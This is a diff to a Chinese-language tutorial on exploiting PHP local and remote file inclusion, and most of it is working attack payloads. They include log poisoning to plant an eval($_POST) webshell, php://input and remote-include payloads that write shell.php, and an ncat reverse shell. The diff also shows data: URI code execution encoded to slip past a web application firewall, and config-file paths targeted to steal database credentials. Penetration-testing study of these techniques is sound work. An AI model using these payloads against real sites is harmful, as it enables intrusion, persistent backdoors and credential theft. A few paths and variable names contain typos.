@@ -113,8 +113,8 @@ include($test);
 
 #### 2. 本地包含漏洞注意事项
 
-	* 
-相对路径：../../../../etc/password
+- 相对路径：../../../../etc/password
+
 * 
 %00截断包含（PHP<5.3.4）（magic_quotes_gpc=off才可以，否则%00会被转义）
 
@@ -127,7 +127,8 @@ echo $_GGET['x'].".php";
 
 
 
-#### 0x07 利用技巧
+## 0x07 利用技巧
+
 首先上传图片马，马包含以下代码：
 
 ```php
@@ -172,3 +173,150 @@ echo $_GGET['x'].".php";
 
 
 
+## 0x09 包含日志
+
+把日志文件包含进来，主要是想找到日志的路径。
+
+- 文件包含漏洞读取apache配置文件
+  - index.php?page=/etc/init.d/httpd
+  - index.php?page=/etc/httpd/conf/httpd.conf
+- 默认位置：/var/log/httpd/access_log
+
+找到日志路径之后，可以利用其记录访问链接信息，我们构造一个访问请求就会被记录下来，那就可以构造一个带有webshell的链接，然后文件包含日志来getshell。
+
+日志会记录客户端请求及服务器响应的信息，访问http://www.com/\<?php phpinfo(); ?\>时，\<?php phpinfo();?\>也会被记录在日志里，也可以插入到User-Agent中。注意可以用Burpsuite发送来绕过URL编码。
+
+示例：制作错误，写入一句话
+
+```
+http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}
+```
+
+菜刀连接即可。
+
+
+
+## 0x0a 读PHP文件
+
+直接包含php文件时会被解析，不能看到源码，可以用封装协议读取：
+
+```
+?page=php://filter/read=convert.base64-encode/resource=config.php
+```
+
+访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码。
+
+
+
+## 0x0b PHP封装协议
+
+当allow_url_include=On时，若执行http://www.com/index.php?page=php://input ，并且提交数据
+
+```
+<?php fputs(fopen("shell.php","w"),"<?php eval($_POST[x])?>")?>
+```
+
+结果将在index.php所在路径下生成一句话文件shell.php
+
+
+
+## 0x0c 远程包含
+
+远程的文件名不能为php可解析的扩展名，allow_url_fopen和allow_url_include为On是必须的。
+
+若在a.txt写入
+
+```
+<?php fputs(fopen("shell.php","w"),"<?php @eval($_POST[x]);?>")?>
+```
+
+
+
+## 0x0d php输入输出流
+
+PHP提供了一些杂项输入/输出（IO）流，允许访问PHP的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。
+
+#### 1. php://input简介
+
+php://input是个可以访问请求的原始数据的只读流。POST请求的情况下，最好使用php://input来代替$HTTP_RAW_POST_DATA，因为它不依赖与特定的php.ini指令。
+
+而且这样的情况下$HTTP_RAW_POST_DATA默认没有填充，比激活always_populate_raw_post_data潜在需要更少的内存。
+
+enctype="multipart/form-data"的时候php://input是无效的。
+
+#### 2. 利用php://input 插入一句话木马
+
+```php
+<?php
+@eval(file_get_contents('php://input'));    
+?>
+```
+
+php://input是用来接收post数据，在post中插入数据：
+
+```
+system('ncat -e /bin/bash localhost 1234');
+```
+
+测试了一下nc反弹shell的利用。
+
+#### 3. php://input将文件包含漏洞变成代码执行漏洞
+
+文件中存在包含漏洞的代码：
+
+```php
+<?php @include($_GET['file'])?>
+```
+
+使用php://input，将执行代码通过hackbar在POST data中提交，即构造请求，请求链接如下：
+
+```
+http://127.0.0.1/index.php?file=php://input
+```
+
+然后用hackbar或其他工具在POST data处写入：
+
+```
+<?php system('ifconfig');?>
+```
+
+#### 4. data URI schema
+
+将文件包含漏洞变成代码执行漏洞并绕过360网站卫士的WAF。
+
+很多时候我们是急需读取PHP格式的配置文件，例如：
+
+- dedecms数据库配置文件data/common.inc.php
+- discuz全局配置文件config/config_global.php
+- phpcms配置文件caches/configs/database.php
+- phpwind配置文件conf/database.php
+- phpwind配置文件conf/database.php
+- wordpress配置文件wp-config.php
+
+举个例子，读取指定文件FileInclude.php的代码：
+
+```
+http://127.0.0.1/index.php?file=data:text/plain,<?php system('cat /var/www/FileInclude.php')?>
+```
+
+注意，我们看到转化后的GET请求的参数中包含\<?的标记，在遇到有些WAF，包括云WAF（例如360网站卫士），就会被视为攻击代码而拦截下来，所以一般会加base64编码。
+
+```
+# base64编码后传输
+data:text/plain;base64,[攻击代码的base64编码]
+
+# 直接传输
+data:text/plain,[攻击代码]
+```
+
+#### 5. php://filter
+
+php://filter可以读取php文件的源码内容。
+
+用法：
+
+```
+php://filter/read=convert.base64-encode/resource=[文件路径]
+```
+
+将得到的base64的数据解码得到php文件内容。
